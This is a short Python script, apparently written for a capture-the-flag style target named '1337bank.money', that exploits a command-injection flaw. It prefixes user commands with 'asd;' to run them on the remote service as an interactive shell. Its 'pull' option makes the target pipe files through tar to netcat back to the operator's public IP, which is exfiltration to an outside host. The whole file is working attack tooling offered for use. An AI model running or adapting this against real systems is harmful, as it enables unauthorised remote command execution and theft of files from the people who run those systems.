""" PLEASE NOTE: use a small delay between instructions otherwise it will not load the output"""
import socket
import os
from requests import get
host = "1337bank.money" # IP address here
port = 1337 # Port here
dir = "/"
ip = get('https://api.ipify.org').text


if __name__ == '__main__':
    running = True
    while running:
        print("> ",end = '')
        first = input()       
        if first == "shell":        
            while running: 

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                print(dir, end='')
                print("> ",end = '')
                cmd = input()  
                msg = "asd; cd " + dir + "; " + cmd + "\n"
                s.send(msg.encode('utf-8'))
                
                if cmd == "quit":
                    break
                
                
                if cmd == "cd":
                    dir = "/"
                elif "cd" in cmd:
                    dir = cmd[3:]
                else:
                    data = s.recv(1024) 
                    data = s.recv(1024)
                    data = s.recv(1024)
                    for x in data.decode('utf-8').split("\\"):
                        print(x)


        elif first == "help":
            print ("1. shell: Drop into an interactive shell and allow users to gracefully exit")
            print ("2. pull <remote-path> <local-path>: Download files")
            print ("3. help: Shows this help menu")
            print ("4. quit: Quit the shell")
        elif "pull" in first:
                split = first.split(" ")
                print(split)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port)) 
                msg = "asd; " + "tar -cf - " + split[1] + " | nc " + ip + " 1234" + "\n"           
                s.send(msg.encode('utf-8'))
                os.system("cd "+ split[2])
                os.system("nc -l 1234 | tar x")
                
        elif first == "exit":
            running = False
            break

                
